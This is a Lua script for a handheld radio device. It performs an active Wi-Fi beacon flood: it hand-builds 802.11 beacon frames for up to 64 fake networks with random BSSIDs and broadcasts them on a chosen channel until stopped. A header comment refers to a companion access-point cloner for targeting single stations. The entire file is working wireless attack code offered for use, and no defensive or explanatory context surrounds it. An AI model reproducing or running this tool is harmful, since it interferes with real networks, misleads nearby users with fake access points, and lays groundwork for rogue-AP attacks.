-- Beacon flood (ACTIVE, transmits): generate N SSIDs with random BSSIDs (prefix + number) and rotate their
-- beacons on one channel, so scanners fill with fake networks. Runs until Back.
--
-- TARGETING: broadcast only (all listeners see the whole flood).
-- MICRO-TARGETING NOT IMPLEMENTED: beacons are addressed to everyone; there is no station-addressed beacon.
-- To aim at one station, see ap_cloner_lua (per-station probe/auth/assoc answers).

-- keyboard read that treats a cancel (nil) as an empty string
local function txt(...) return input.text(...) or "" end

local BEACON_MS = 102

local function hdr(fc, dst, src, bssid)
  return string.char(fc, 0) .. "\0\0" .. dst .. src .. bssid .. "\0\0"
end

local function beacon(ssid, bssid, ch)
  return hdr(0x80, string.rep("\255", 6), bssid, bssid) .. string.rep("\0", 8) .. "\100\0" .. "\1\0"
    .. string.char(0, #ssid) .. ssid .. "\1\4\130\132\139\150" .. "\3\1" .. string.char(ch)
end

local function random_bssid()
  local b = crypto.random(6)
  return string.char((b:byte(1) & 0xFE) | 0x02) .. b:sub(2)
end

local ok, err = pcall(function()
  local prefix = txt("SSID prefix", "FREE-WIFI", 24)
  if not prefix or prefix == "" then return end
  local n = math.tointeger(tonumber(txt("How many (1-64)", "16", 2))) or 16
  if n < 1 then n = 1 elseif n > 64 then n = 64 end
  local ch = math.tointeger(tonumber(txt("Channel 1-13", "6", 2))) or 6
  if ch < 1 or ch > 13 then ch = 6 end

  local frames = {}
  for i = 1, n do
    local name = string.format("%s-%02d", prefix, i):sub(1, 32)
    frames[i] = beacon(name, random_bssid(), ch)
  end
  local started, why = wifi.tx_start({ channel = ch })
  if not started then
    gfx.clear(); gfx.text(14, 60, "could not start: " .. tostring(why), "ui12"); gfx.present()
    while input.wait() ~= "back" do end
    return
  end
  local i, last_draw = 1, -1000
  while true do
    local now = system.millis()
    wifi.tx(frames[i])
    i = i % #frames + 1
    if now - last_draw >= 1000 then
      local info = wifi.tx_info()
      gfx.clear(); local W, H = gfx.size()
      gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, "Beacon flood (ACTIVE)", "ui12", "bw")
      gfx.text(14, 60, string.format("%d fake SSIDs on ch %d", n, ch), "ui12")
      gfx.text(14, 90, "sent " .. (info and info.sent or 0), "ui12")
      gfx.text(14, H - 34, "Back = stop", "small")
      gfx.present()
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(BEACON_MS // n + 1)
  end
  wifi.tx_stop()
end)
pcall(function() wifi.tx_stop() end)
if not ok then
  gfx.clear(); gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b"); gfx.present()
  while input.wait() ~= "back" do end
end
app.exit()
